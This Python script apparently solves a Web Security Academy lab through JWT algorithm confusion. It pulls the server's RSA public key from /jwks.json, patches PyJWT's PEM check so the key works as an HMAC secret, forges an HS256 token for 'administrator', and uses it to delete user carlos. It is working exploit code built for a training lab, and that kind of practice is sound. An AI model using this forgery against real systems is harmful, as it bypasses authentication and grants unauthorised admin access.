from web_security_academy.core.logger import logger
from cryptography.hazmat.primitives import serialization

import json
import jwt
import re


def solve_lab(session):
    jwk = json.loads(session.get_path("/jwks.json").text)["keys"][0]
    public_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwk)
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    logger.info("Extracted public key from /jwks.json")

    # Allows asymmetric key to be used as an HMAC secret
    jwt.utils._PEM_RE = re.compile(b"^$")

    payload = {"sub": "administrator"}
    token = jwt.encode(payload, pem, algorithm="HS256")
    session.cookies.set("session", token)
    logger.info("Set the session cookie as a signed JWT of the following JSON:")
    logger.info(payload)

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
